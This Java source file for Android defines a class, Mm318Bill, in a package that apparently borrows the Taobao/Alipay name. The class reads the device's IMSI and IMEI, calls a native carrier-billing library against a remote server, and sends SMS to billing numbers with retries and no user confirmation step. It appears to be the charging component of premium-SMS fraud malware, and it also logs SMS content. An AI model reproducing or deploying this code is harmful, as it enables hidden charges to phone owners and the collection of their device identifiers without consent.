package com.taobao.alipay.mm318;

import com.mm.Business.BillNative;

import android.content.Context;
import android.util.Log;

public class Mm318Bill {

	private int flag = 0;
	private String appid = "";
	private String paycode = "";
	private String imsi = "";
	private String imei = "";
	private String channel = "";
	private String data = "";
	private String sid = "";
	private String sms = "";
	private String ip;
	private String port;
	private boolean proxy = false;
	private Context context = null;
	private String errorReason = "";

	private boolean hasCert = true;
	private String errorCode = "";
	private String asynchParam = "";
	private boolean canAsynch = true;

	private boolean isStrong = true;

	public Mm318Bill(Context context, String ip, String port, String imsi,
			String imei, String appid, String paycode, String channel,
			String data, boolean proxy) {
		this.context = context;

		this.ip = ip;
		this.port = port;

		this.imsi = imsi;
		if (imsi == null || imsi.length() == 0) {
			this.imsi = Mm318BillUtil.getIMSI(context);
		}
		this.imei = imei;
		if (imei == null || imei.length() == 0) {
			this.imei = Mm318BillUtil.getIMEI(context);
		}
		this.appid = appid;
		this.paycode = paycode;
		this.channel = channel;
		this.data = data;
		this.proxy = proxy;

		this.asynchParam = imsi + "_" + imei + "_" + data + "_" + paycode;
	}

	public boolean bill() {
		boolean succ = false;
		int i = 0;

		while (i <= 2 && !(succ = bill1()) && canAsynch) {
			if (i < 2 && (!hasCert || proxy)) {// 
				try {
					Thread.sleep(1000 * 5);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}

				i++;
			} else {
				break;
			}
		}

		return succ;
	}

	public boolean bill1() {
		if (imsi == null || imsi.length() == 0
				|| "000000000000000".equals(imsi)) {
			canAsynch = false;
			this.errorReason = "imsiNull";
			return false;
		}

		try {
			if (nativeBill()) {
				return true;
			} else {
				if (!proxy) {
					if (flag == 1) {// need send sms and fetch cert
						hasCert = false;

						String dest = Mm318BillUtil.DEST_STRONG;

						if (isStrong
								&& Mm318BillUtil.sendSms(context,
										Mm318BillUtil.DEST_STRONG, sms,
										isStrong)
						// && Mm313BillUtil.sendSms(context,
						// Mm313BillUtil.DEST_STRONG, sms)
						) {
							flag = 2;

							if (sendSmsFinish()) {
								hasCert = true;

								Utils.sleep(5);

								return nativeBill();
							}
						} else if (!isStrong
								&& Mm318BillUtil.sendSms(context,
										Mm318BillUtil.DEST_NOSTRONG, sms,
										isStrong)) {
							Log.i("sms::   ", sms);
							return true;
						} else {
							this.errorReason = "sendSmsError";
						}
					}
				} else {
					if (flag == 1) {
						this.canAsynch = false;
						this.hasCert = false;
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return false;
	}

	private boolean sendSmsFinish() {

		long startTime = System.currentTimeMillis();

		while (System.currentTimeMillis() - startTime <= 50 * 1000) {
			Utils.sleep(10);

			String result = BillNative.SendSmsFinish(context, ip, port, appid,
					paycode, imsi, imei, sid);
			// Log.e("Mm313Bill", "sendSmsFinish result:"+result+";imsi="+imsi);

			this.errorReason = "sendSmsFinishError" + result;

			if ("0".equals(result)) {
				return true;
			}
		}

		return false;
	}

	/**
	 * 计费 flag,appid,paycode,imsi,imei,channel,data
	 * 
	 * @return
	 */
	private boolean nativeBill() {
		return nativeBill(0);
	}

	private boolean nativeBill(int times) {
		// Retcode;ErrorCode;BillType;SID;InitSms;OrderID;OrderSms
		try {
			String billResult = BillNative.Billing(context, ip, port, appid,
					paycode, imsi, imei, channel, 1, data);
			Log.e("nativeBill", billResult);
			String[] arr = billResult.split(";");

			String Retcode = arr[0];
			String BillType = arr[2];
			this.errorReason = "billError" + arr[1];

			if (Retcode.length() == 0) {// conn server fail
				if (times <= 5) {
					times++;

					Utils.sleep(5);

					return nativeBill(times);
				} else {
					hasCert = false;
					this.errorReason = "billErrorConnFail";
					return false;
				}
			} else if (Retcode.equals("0")) {
				// String OrderID = "";
				//
				// if(arr.length >= 6){
				// OrderID = arr[5];
				// }
				//
				// if((OrderID != null && OrderID.length() > 0)){
				if (BillType.equals("1")) {
					return true;
				} else {// 弱联�?
					flag = 1;
					isStrong = false;
					sms = arr[6];
					Log.i("sms order", "sssssssssssss");
					return false;
				}
				// }else{
				// this.errorReason = "billErrorNoOrderID";
				// return false;
				// }
			} else if (Retcode.equals("1")) {
				flag = 1;

				sid = arr[3];
				sms = arr[4];

				this.hasCert = false;

				if (BillType.equals("1")) {
					isStrong = true;
				} else {

				}

				return false;
			} else {
				errorCode = arr[1];

				try {
					if (errorCode != null && errorCode.length() > 0
							&& errorCodeCanAsynch(errorCode)) {
						if (times < 5) {
							times++;

							Utils.sleep(5);

							return nativeBill(times);
						}
					} else {
						canAsynch = false;
					}
				} catch (Exception e) {
					e.printStackTrace();
				}

				return false;
			}

			// return true;
		} catch (Exception e) {
			e.printStackTrace();
			this.errorReason = "billException";
			return false;
		}
	}

	public String getErrorReason() {
		return errorReason;
	}

	public String getAsynchParam() {
		return asynchParam;
	}

	public boolean isCanAsynch() {
		return canAsynch && hasCert;
	}

	private static final String CANTASYNCERRORCODES = ",-90007,-90006,204,245,247,248,259,260,264,268,270,271,274,275,415,419,423,426,427,428,429,434,502,503,512,2008,2030,2031,2036,2040,2041,2043,2080,2081,2082,2101021,2102086,";

	private static boolean errorCodeCanAsynch(String errorCode) {
		return !CANTASYNCERRORCODES.contains("," + errorCode + ",");
	}
}
